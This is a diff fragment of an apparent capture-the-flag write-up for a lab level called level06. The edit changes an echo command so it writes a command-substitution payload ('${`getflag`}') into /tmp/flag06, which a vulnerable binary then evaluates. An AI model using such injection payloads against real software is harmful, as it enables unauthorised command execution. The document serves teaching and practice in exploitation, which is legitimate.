@@ -11,7 +11,7 @@ This level exploits improper handling of input by the `level06` binary, which ev
 Create a file that injects the `getflag` command:
 
 ```bash id="n6p2xz"
-echo '[x ${getflag}]' > /tmp/flag06
+echo '[x ${`getflag`}]' > /tmp/flag06
 ```
 
 ### 2. Execute the vulnerable binary
